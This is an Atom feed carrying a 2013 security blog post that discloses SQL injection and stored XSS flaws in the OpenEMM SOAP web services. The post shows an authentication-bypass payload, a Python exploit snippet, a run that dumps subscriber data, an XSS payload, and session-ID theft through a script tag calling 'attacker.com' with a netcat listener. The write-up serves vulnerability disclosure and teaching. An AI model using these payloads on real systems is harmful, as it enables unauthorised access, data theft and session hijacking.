<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: openemm | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/openemm/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2019-08-22T10:30:15-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
    <updated>2013-07-28T22:24:15-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>

<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>

<p>```
  /**</p>

<pre><code> * Gets the SQL string.
 */
public static String getSQLSafeString(String input) {
    if (input == null) {
        return " ";
    } else {
        return input.replace("'", "''");
    }
}
</code></pre>

<p>```</p>

<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>

<p><code>
\' AND UNION SELECT 1,2,3;--
</code></p>

<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>

<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>

<p>```
protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {</p>

<pre><code>    boolean result=false;
    Connection dbConn=this.getConnection(msct);
    Statement agnStatement=null;
    ResultSet rset=null;

    try {
        agnStatement=dbConn.createStatement();
        rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
        if(rset!=null &amp;&amp; rset.next()) {
            result=true;
        } else {
            result=false;
            HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
            log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
        }
</code></pre>

<p>```</p>

<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>

<p>The following code will bypass SOAP authentication and add a new mailing list:</p>

<p>```
from SOAPpy import WSDL</p>

<p>wsdl_file = &ldquo;./ws.wsdl&rdquo;
sploit = &ldquo;\&lsquo; OR 1=1;&mdash; &rdquo;</p>

<p><em>server = WSDL.Proxy(wsdl_file)
ret = </em>server.addMailinglist(&ldquo;wsadmin&rdquo;, sploit, &ldquo;w00t&rdquo;, &ldquo;w00t&rdquo;)
if ret > 0:</p>

<pre><code>print 'success (%d)'%ret
</code></pre>

<p>```</p>

<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>

<p>```
root@jali:~/exploits# python openemm_wsdl.py -h
usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [&mdash;dm] [&mdash;ds]</p>

<p>optional arguments:
  -h, &mdash;help  show this help message and exit
  -i HOST     server address
  -s          fetch all subscribers
  -m MLIST    create new mailing list (XSS)
  &mdash;dm        delete all mailing lists
  &mdash;ds        delete all subscribers
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
&lt;SOAPpy.Types.structType multiRef at 30449464>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Last&rsquo;, &lsquo;First&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x66;&#x69;&#114;&#x73;&#x74;&#46;&#108;&#97;&#115;&#116;&#x40;&#x64;&#x6f;&#x6d;&#97;&#x69;&#110;&#46;&#x6f;&#114;&#x67;">&#x66;&#x69;&#x72;&#x73;&#x74;&#46;&#x6c;&#x61;&#115;&#116;&#64;&#100;&#111;&#x6d;&#x61;&#105;&#x6e;&#x2e;&#x6f;&#x72;&#x67;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;1&rsquo;]}
&lt;SOAPpy.Types.structType multiRef at 30446728>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Name&rsquo;, &lsquo;No&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#110;&#111;&#46;&#x6e;&#x61;&#x6d;&#x65;&#64;&#x79;&#111;&#x75;&#x72;&#100;&#x6f;&#x6d;&#x61;&#105;&#110;&#x2e;&#99;&#111;&#109;">&#x6e;&#x6f;&#x2e;&#110;&#x61;&#109;&#x65;&#x40;&#x79;&#x6f;&#x75;&#x72;&#100;&#111;&#109;&#x61;&#x69;&#x6e;&#46;&#99;&#111;&#109;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2&rsquo;]}
[!] Discovered 2 subscribers
root@jali:~/exploits#
```</p>

<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>

<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>

<p>```
mysql> select user();
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| user()            |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| agnitas@localhost |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.00 sec)</p>

<p>mysql> show grants;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| Grants for agnitas@localhost                                                                                                                       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| GRANT USAGE ON <em>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; IDENTIFIED BY PASSWORD &lsquo;<em>BC428C4FAA04992D1E8CF04545DD70FA60E588C5&rsquo;                                     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm</code>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo;     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm_cms</code>.* TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
3 rows in set (0.00 sec)</p>

<p>mysql>
```</p>

<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>

<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>

<p><code>
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
[!] Description field vulnerable to stored xss!
[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
[!] Saved successfully
root@jali:~/exploits#
</code></p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg">http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg</a>"></p>

<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>

<p>```
root@jali:~/exploits# nc -l -p 80
GET / HTTP/1.1
Host: 192.168.1.147
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
Accept: <em>/</em>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1">http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1</a>
Connection: keep-alive</p>

<p>^C
root@jali:~/exploits#
```</p>

<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>

<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
]]></content>
  </entry>
  
</feed>
